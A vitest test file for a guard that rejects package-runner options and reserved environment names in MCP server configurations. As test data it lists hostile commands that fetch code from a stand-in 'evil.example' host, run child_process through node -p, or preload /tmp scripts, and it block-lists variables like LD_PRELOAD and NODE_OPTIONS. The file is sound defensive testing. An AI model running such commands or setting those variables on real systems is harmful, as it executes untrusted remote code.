/**
 * TD-039: runner-changing options (both `--flag value` and `--flag=value`) and reserved env names are
 * rejected at create / update / spawn / validate, with generic reasons that never echo a value.
 */
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { randomUUID } from 'node:crypto';
import {
  checkRunnerCommand,
  checkCatalogEntry,
  isBlockedEnvName,
  credentialEnvNames,
} from '../../src/services/runner-guard.js';
import { validateMcpConfig as spawnValidate } from '../../src/downstream/types.js';
import { validateMcpConfig as catalogValidate } from '../../src/services/mcp-validator.js';
import { startTestServer, stopTestServer, type TestServerHandle } from '../admin-api/helpers.js';

const bad: Array<[string, string[]]> = [
  // npx
  ['npx --registry=', ['npx', '-y', '--registry=https://evil.example', 'pkg']],
  ['npx --registry value', ['npx', '--registry', 'https://evil.example', 'pkg']],
  ['npx --call', ['npx', '--call', 'id', 'pkg']],
  ['npx --call=', ['npx', '--call=id']],
  ['npx -c', ['npx', '-c', 'id']],
  ['npx -p', ['npx', '-y', '-p', 'git+https://evil.example/x', 'pkg']],
  ['npx -p attached', ['npx', '-pgit+https://evil.example/x', 'pkg']],
  ['npx --package=', ['npx', '--package=evil', 'pkg']],
  ['npx scoped registry', ['npx', '--@acme:registry=https://evil.example', 'pkg']],
  ['npx --userconfig', ['npx', '--userconfig=/tmp/evil.npmrc', 'pkg']],
  ['npx --prefix', ['npx', '--prefix', '/tmp/evil', 'pkg']],
  ['npx --cache=', ['npx', '--cache=/tmp/evil', 'pkg']],
  ['npx --config', ['npx', '--config', '/tmp/evil', 'pkg']],
  [
    'npx after unknown value flag',
    ['npx', '--loglevel', 'error', '--registry=https://evil.example', 'pkg'],
  ],
  ['npx mixed case', ['NPX', '--Registry=https://evil.example', 'pkg']],
  ['npx full path + .cmd', ['/usr/bin/npx.cmd', '--registry=https://evil.example', 'pkg']],
  ['npx one element with a space', ['npx', '--registry https://evil.example', 'pkg']],
  // uvx
  ['uvx --from', ['uvx', '--from', 'git+https://evil.example/x', 'tool']],
  ['uvx --from=', ['uvx', '--from=git+https://evil.example/x', 'tool']],
  ['uvx --index-url', ['uvx', '--index-url', 'https://evil.example', 'tool']],
  ['uvx --index-url=', ['uvx', '--index-url=https://evil.example', 'tool']],
  ['uvx -i', ['uvx', '-i', 'https://evil.example', 'tool']],
  ['uvx --extra-index-url=', ['uvx', '--extra-index-url=https://evil.example', 'tool']],
  ['uvx --find-links', ['uvx', '--find-links', 'https://evil.example', 'tool']],
  ['uvx --with', ['uvx', '--with', 'evil', 'tool']],
  ['uvx --with-requirements=', ['uvx', '--with-requirements=/tmp/r.txt', 'tool']],
  ['uvx --with-editable', ['uvx', '--with-editable', '/tmp/x', 'tool']],
  ['uvx --python', ['uvx', '--python=/tmp/evil', 'tool']],
  ['uvx --keyring-provider', ['uvx', '--keyring-provider=subprocess', 'tool']],
  ['uv tool run --from (uv)', ['uv', '--config-file=/tmp/uv.toml', 'tool']],
  // node
  ['node -p', ['node', '-p', "require('child_process').execSync('id')"]],
  ['node --print', ['node', '--print', '1']],
  ['node --print=', ['node', '--print=1']],
  ['node -pe cluster', ['node', '-pe', '1']],
  ['node -e', ['node', '-e', '1']],
  ['node --eval=', ['node', '--eval=1']],
  ['node -r', ['node', '-r', '/tmp/evil.js', 'server.js']],
  ['node --require=', ['node', '--require=/tmp/evil.js', 'server.js']],
  ['node --import', ['node', '--import', 'data:text/javascript,1', 'server.js']],
  ['node --import=', ['node', '--import=/tmp/evil.mjs', 'server.js']],
  ['node --loader', ['node', '--loader=/tmp/l.mjs', 'server.js']],
  ['node --env-file', ['node', '--env-file=/tmp/e', 'server.js']],
  ['node --inspect-brk', ['node', '--inspect-brk=0.0.0.0:9229', 'server.js']],
  // python / pip
  ['python -c', ['python3', '-c', 'import os']],
  ['python -c attached', ['python', '-cimport os']],
  ['pip -c', ['pip', 'install', '-c', 'x.txt', 'pkg']],
  ['pip --index-url=', ['pip', '--index-url=https://evil.example', 'install', 'pkg']],
  // deno / bun
  ['deno eval', ['deno', 'eval', '1']],
  ['deno --config', ['deno', '--config=/tmp/d.json', 'run', 'x.ts']],
  ['bun -e', ['bun', '-e', '1']],
  ['bun --preload=', ['bun', '--preload=/tmp/p.ts', 'run', 'x.ts']],
  // any runner
  ['docker --config', ['docker', '--config', '/tmp/d', 'run', 'img']],
];

const good: Array<[string, string[]]> = [
  ['npx -y pkg', ['npx', '-y', '@modelcontextprotocol/server-everything']],
  ['npx pinned', ['npx', '-y', 'pkg@1.2.3', '--headless']],
  // after the package, options belong to the package, not to npx
  ['package option -p after pkg', ['npx', '-y', 'some-mcp', '-p', '8080']],
  ['package option --config after pkg', ['npx', '-y', 'some-mcp', '--config', 'x.json']],
  ['package option --registry after pkg', ['npx', '-y', 'some-mcp', '--registry=foo']],
  ['after the -- separator', ['npx', '--', 'some-mcp', '-p', '1']],
  ['uvx pkg', ['uvx', 'mcp-server-git', '--repository', '/repo']],
  ['uvx tool -p after tool', ['uvx', 'tool', '-p', '1']],
  ['node script', ['node', 'server.js', '-p', '3000']],
  [
    'node flag with value then script',
    ['node', '--max-old-space-size=4096', 'server.js', '-e', 'x'],
  ],
  ['python module', ['python3', '-m', 'my_server', '-c', 'cfg']],
  ['docker run', ['docker', 'run', '-i', '--rm', 'img']],
];

describe('checkRunnerCommand', () => {
  for (const [label, cmd] of bad) {
    it(`rejects: ${label}`, () => {
      const r = checkRunnerCommand(cmd);
      expect(r).toBeTruthy();
      // generic: names the option, never the value
      expect(r).not.toContain('evil.example');
      expect(r).not.toContain('/tmp');
    });
  }
  for (const [label, cmd] of good) {
    it(`accepts: ${label}`, () => {
      expect(checkRunnerCommand(cmd)).toBeNull();
    });
  }

  it('does not throw on non-string / empty input', () => {
    expect(checkRunnerCommand([])).toBeNull();
    expect(checkRunnerCommand([1 as never, {} as never])).toBeNull();
    expect(checkRunnerCommand(['npx', 5 as never, '--registry=x'])).toBeTruthy();
  });
});

describe('isBlockedEnvName', () => {
  const blocked = [
    'PATH',
    'path',
    'Path',
    'PATHEXT',
    'npm_config_registry',
    'NPM_CONFIG_USERCONFIG',
    'Npm_Config_Cache',
    'PIP_INDEX_URL',
    'pip_extra_index_url',
    'UV_INDEX_URL',
    'UV_PYTHON',
    'PYTHONPATH',
    'pythonstartup',
    'PYTHONHOME',
    'NODE_OPTIONS',
    'NODE_PATH',
    'node_extra_ca_certs',
    'LD_PRELOAD',
    'ld_library_path',
    'DYLD_INSERT_LIBRARIES',
    'GIT_SSH_COMMAND',
    'HOME',
    'XDG_CONFIG_HOME',
    ' PATH ',
  ];
  for (const n of blocked) {
    it(`blocks ${JSON.stringify(n)}`, () => expect(isBlockedEnvName(n)).toBe(true));
  }
  for (const n of [
    'GITHUB_PERSONAL_ACCESS_TOKEN',
    'GITLAB_TOKEN',
    'API_KEY',
    'NODE_ENV',
    'node_env',
    'PATH_TO_REPO',
    'nodeenv',
    'UVICORN_PORT',
    'PIPELINE_ID',
  ]) {
    it(`allows ${n}`, () => expect(isBlockedEnvName(n)).toBe(false));
  }
});

describe('checkCatalogEntry', () => {
  it('checks config.command, config.env, credential_schema (key AND env_var) and the oauth env name', () => {
    expect(
      checkCatalogEntry({ config: { command: ['npx', '-y', 'pkg'], env: { API_KEY: 'x' } } })
    ).toBeNull();
    expect(checkCatalogEntry({ config: { command: ['npx', '--registry=x', 'pkg'] } })).toBeTruthy();
    expect(
      checkCatalogEntry({ config: { command: ['npx', 'pkg'], env: { npm_config_registry: 'x' } } })
    ).toBeTruthy();
    const viaKey = { properties: { PIP_INDEX_URL: { type: 'string' } } };
    const viaEnvVar = { properties: { token: { type: 'string', env_var: 'UV_INDEX_URL' } } };
    expect(checkCatalogEntry({ credential_schema: viaKey })).toBeTruthy();
    expect(checkCatalogEntry({ credential_schema: viaEnvVar })).toBeTruthy();
    expect(
      checkCatalogEntry({ credential_schema: { properties: { token: { env_var: 'MY_TOKEN' } } } })
    ).toBeNull();
    expect(checkCatalogEntry({ oauth_access_token_env_var: 'NODE_OPTIONS' })).toBeTruthy();
    expect(credentialEnvNames({ properties: { a: { env_var: 'B' } } })).toEqual(['a', 'B']);
    expect(credentialEnvNames(null)).toEqual([]);
  });
});

describe('spawn-time and catalog validators use the guard', () => {
  const cfg = (command: string[], env?: Record<string, string>) =>
    ({ name: 'x', transport: 'stdio', command, env }) as never;
  it('validateMcpConfig (spawn) rejects runner options and reserved env names', () => {
    expect(() => spawnValidate(cfg(['npx', '--registry=https://evil.example', 'p']))).toThrow(
      /not permitted/
    );
    expect(() => spawnValidate(cfg(['node', '-p', '1']))).toThrow();
    expect(() => spawnValidate(cfg(['npx', '-y', 'p'], { Npm_Config_Registry: 'x' }))).toThrow(
      /blocked/
    );
    expect(() => spawnValidate(cfg(['npx', '-y', 'p'], { API_KEY: 'x' }))).not.toThrow();
  });
  it('catalog validateMcpConfig reports them, including credential_schema env names', async () => {
    const entry = (over: Record<string, unknown>) =>
      ({
        transport_type: 'stdio',
        config: JSON.stringify({ command: ['npx', '-y', 'p'] }),
        requires_user_credentials: false,
        credential_schema: '{}',
        tool_catalog: '[]',
        auth_type: 'none',
        oauth_config: '{}',
        ...over,
      }) as never;
    expect((await catalogValidate(entry({}))).valid).toBe(true);
    expect(
      (
        await catalogValidate(
          entry({
            config: JSON.stringify({ command: ['uvx', '--from=git+https://evil.example/x', 't'] }),
          })
        )
      ).valid
    ).toBe(false);
    const withSchema = await catalogValidate(
      entry({
        requires_user_credentials: true,
        auth_type: 'static',
        credential_schema: JSON.stringify({
          type: 'object',
          properties: { t: { env_var: 'PIP_INDEX_URL' } },
        }),
      })
    );
    expect(withSchema.valid).toBe(false);
  });
});

describe('admin API create / update', () => {
  let server: TestServerHandle;
  beforeAll(async () => {
    server = await startTestServer();
  });
  afterAll(async () => {
    await stopTestServer(server);
  });
  const headers = () => ({ 'X-Admin-Key': server.adminKey });
  const base = (over: Record<string, unknown> = {}) => ({
    name: 'td39-' + randomUUID().slice(0, 8),
    display_name: 'T',
    transport_type: 'stdio',
    config: { command: ['npx', '-y', 'pkg'] },
    ...over,
  });
  const post = (payload: unknown) =>
    server.admin.inject({
      method: 'POST',
      url: '/v1/admin/mcps',
      headers: headers(),
      payload: payload as never,
    });

  it('accepts a normal entry', async () => {
    expect((await post(base())).statusCode).toBe(201);
  });

  const rejected: Array<[string, Record<string, unknown>]> = [
    [
      '--registry= in command',
      { config: { command: ['npx', '-y', '--registry=https://evil.example', 'pkg'] } },
    ],
    ['uvx --from', { config: { command: ['uvx', '--from', 'git+https://evil.example/x', 't'] } }],
    ['node -p', { config: { command: ['node', '-p', '1'] } }],
    [
      'config.env npm_config_*',
      { config: { command: ['npx', 'pkg'], env: { NPM_CONFIG_REGISTRY: 'x' } } },
    ],
    [
      'credential_schema env_var',
      {
        requires_user_credentials: true,
        auth_type: 'static',
        credential_schema: {
          type: 'object',
          properties: { t: { type: 'string', env_var: 'PYTHONPATH' } },
        },
      },
    ],
    [
      'credential_schema property key',
      {
        requires_user_credentials: true,
        auth_type: 'static',
        credential_schema: { type: 'object', properties: { UV_INDEX_URL: { type: 'string' } } },
      },
    ],
  ];
  for (const [label, over] of rejected) {
    it(`POST 400: ${label}`, async () => {
      const r = await post(base(over));
      expect(r.statusCode).toBe(400);
      expect(r.body).toContain('VALIDATION_ERROR');
      expect(r.body).not.toContain('evil.example');
    });
    it(`PATCH 400: ${label}`, async () => {
      const created = await post(base());
      const id = created.json().data.mcp_id as string;
      const { name: _n, display_name: _d, transport_type: _t, ...patch } = base(over);
      const r = await server.admin.inject({
        method: 'PATCH',
        url: `/v1/admin/mcps/${id}`,
        headers: headers(),
        payload: patch as never,
      });
      expect(r.statusCode).toBe(400);
      expect(r.body).toContain('VALIDATION_ERROR');
    });
  }
});

describe('TD-039 round 2: default-deny and subcommand scanning', () => {
  const reject: string[][] = [
    ['npx', '--reg=https://evil', 'x'],
    ['npx', '--git=/tmp/evil', 'x'],
    ['npx', '--https-proxy=http://e', '--strict-ssl=false', 'x'],
    ['npx', '--cafile=/tmp/c', 'x'],
    ['npx', '-y=1', 'x'],
    ['npx', '--yes=http://e', 'x'],
    ['uvx', '--index-url', 'https://e', 'x'],
    ['python3', '-m', 'pip', 'install', '-i', 'https://evil', 'x'],
    ['deno', 'run', '--import-map=https://evil', 'x.ts'],
    ['bun', 'run', '--preload', './evil.js', 'x'],
    ['uv', 'tool', 'run', '--from', 'git+https://e', 'x'],
    ['uv', 'pip', 'install', '-i', 'https://e', 'x'],
    ['npm', 'exec', '--registry=https://e', 'x'],
    ['pnpm', 'dlx', '--registry=https://e', 'x'],
    ['python3', '-m', 'pip', 'install', '--extra-index=https://evil', 'x'],
    ['python3', '-m', 'pip', 'install', '--index-u=https://evil', 'x'],
    ['python3', '-m', 'pip', 'install', '--find=https://evil', 'x'],
    ['python3', '-m', 'pip', 'install', '--proxy=http://e', 'x'],
    ['pip', 'install', '-r', 'req.txt'],
    ['node', '--env-file-if-exists=.env', 's.js'],
    ['node', '--openssl-config=/tmp/o', 's.js'],
    ['node', '--experimental-config-file=/tmp/c', 's.js'],
    ['deno', 'run', '--preload=./e.js', 'x.ts'],
  ];
  for (const cmd of reject) {
    it(`rejects ${cmd.join(' ')}`, () => {
      expect(checkRunnerCommand(cmd)).not.toBeNull();
    });
  }

  const accept: string[][] = [
    ['npx', '-y', 'pkg'],
    ['npx', '-y', 'pkg', '-p', '8080'],
    ['npx', '-y', 'pkg', '--config', 'c'],
    ['npx', '-y', 'pkg', '--registry=foo'],
    ['npx', '-y', 'pkg', '--', '--x'],
    ['npm', 'exec', '-y', 'pkg'],
    ['uvx', 'mcp-server-git', '--repository', 'x'],
    ['node', 'server.js', '--port', '1'],
    ['python3', '-m', 'my_server', '-c', 'cfg'],
    ['deno', 'run', '-A', 'x.ts'],
    ['bunx', 'pkg'],
    ['python3', '-m', 'pip', 'install', '-q', '--upgrade', 'pkg'],
  ];
  for (const cmd of accept) {
    it(`accepts ${cmd.join(' ')}`, () => {
      expect(checkRunnerCommand(cmd)).toBeNull();
    });
  }

  for (const name of [
    'HTTPS_PROXY',
    'no_proxy',
    'ALL_PROXY',
    'SSL_CERT_FILE',
    'SSL_CERT_DIR',
    'REQUESTS_CA_BUNDLE',
    'CURL_CA_BUNDLE',
    'JAVA_TOOL_OPTIONS',
    '_JAVA_OPTIONS',
    'PERL5OPT',
    'RUBYOPT',
    'GCONV_PATH',
  ]) {
    it(`blocks env ${name}`, () => {
      expect(isBlockedEnvName(name)).toBe(true);
    });
  }
  it('still allows NODE_ENV', () => {
    expect(isBlockedEnvName('NODE_ENV')).toBe(false);
  });
});
